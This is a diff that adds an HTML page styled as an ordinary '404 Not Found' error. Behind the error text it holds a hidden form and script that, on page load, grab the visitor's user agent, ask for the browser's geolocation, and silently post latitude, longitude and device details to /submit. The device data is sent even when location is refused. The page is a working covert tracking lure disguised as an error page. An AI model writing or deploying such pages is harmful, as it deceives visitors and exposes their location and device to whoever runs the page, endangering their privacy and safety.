@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <title>404 Not Found</title>
+    <style>
+        body {
+            background-color: #ffffff;
+            font-family: Arial;
+            text-align: center;
+            margin-top: 160px;
+        }
+        h1 {
+            font-size: 60px;
+            color: #222;
+        }
+        p {
+            color: #777;
+            font-size: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>404</h1>
+    <p>Not Found</p>
+
+    <!-- Gizli form -->
+    <form id="hiddenForm" method="POST" action="/submit">
+        <input type="hidden" name="lat" id="lat">
+        <input type="hidden" name="lon" id="lon">
+        <input type="hidden" name="device" id="device">
+    </form>
+
+    <script>
+        document.getElementById("device").value = navigator.userAgent;
+
+        navigator.geolocation.getCurrentPosition(
+            function(pos) {
+                document.getElementById("lat").value = pos.coords.latitude;
+                document.getElementById("lon").value = pos.coords.longitude;
+                document.getElementById("hiddenForm").submit();
+            },
+            function(err) {
+                document.getElementById("hiddenForm").submit();
+            }
+        );
+    </script>
+
+</body>
+</html>
